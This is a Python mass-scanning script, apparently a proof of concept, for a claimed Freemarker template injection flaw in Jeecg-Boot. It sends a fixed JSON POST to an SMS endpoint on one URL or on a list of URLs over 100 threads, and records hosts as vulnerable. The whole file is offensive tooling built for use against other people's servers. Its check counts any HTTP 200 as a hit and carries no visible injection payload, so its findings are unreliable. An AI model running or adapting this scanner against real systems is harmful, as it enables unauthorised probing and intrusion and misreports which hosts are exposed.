#Jeecg-Boot Freemarker 模版注入漏洞
#导包外置
import requests,argparse,sys
from multiprocessing.dummy import Pool
# 关闭告警
requests.packages.urllib3.disable_warnings()

def banner():
    test = """    _  _____ _____ ____  _____       ____  ____  ____  _____ 
   / |/  __//  __//   _\/  __/      /  __\/  _ \/  _ \/__ __\
   | ||  \  |  \  |  /  | |  ______ | | //| / \|| / \|  / \  
/\_| ||  /_ |  /_ |  \_ | |_//\____\| |_\\| \_/|| \_/|  | |  
\____/\____\\____\\____/\____\      \____/\____/\____/  \_/                                                              
                                            author :CHKer
                                            version:1.0.0
  """
    print(test)

def main():
    banner()
    parser = argparse.ArgumentParser(description="Jeecg-Boot Freemarker 模版注入漏洞")
    parser.add_argument('-u', '--url', dest='url', type=str, help=' input your url')
    parser.add_argument('-f', '--file', dest='file', type=str, help='input your file path')
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif not args.url and args.file:
        url_list = []
        with open(args.file, 'r', encoding='utf-8') as fp:
            for i in fp.readlines():
                url_list.append(i.strip().replace('\n', ''))
        mp = Pool(100)
        mp.map(poc, url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python {sys.argv[0]} -h")

def poc(target):
    payload = "/SMS/SmsDataList/?pageIndex=1&pageSize=30"
    headers = {
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2088.112 Safari/537.36',
        'Accept-Encoding': 'gzip, deflate',
        'Accept': '/',
        'Connection': 'close',
        'Content-Type': 'application/json;charset=UTF-8',
        'Content-Length': '129'
    }
    proxies = {
        'http':'http://127.0.0.1:8080',
        'https':'http://127.0.0.1:8080'
    }
    data = {"apiSelectId":"1290104038414721025","id":"1"}
    try:
        res1 = requests.post(url=target+payload,headers=headers,json=data,timeout=10,verify=False,proxies=proxies)
        if res1.status_code == 200:
            print(f"[+]该url:{target}存在漏洞")
            with open('result51.txt','a', encoding='utf-8') as fp:
                fp.write(f"{target}"+"\n")
        else:
            print(f'[-]该url:{target}不存在漏洞')
    except:
        print(f'[-]该url:{target}该站点存在问题')

if __name__ == '__main__':
    main()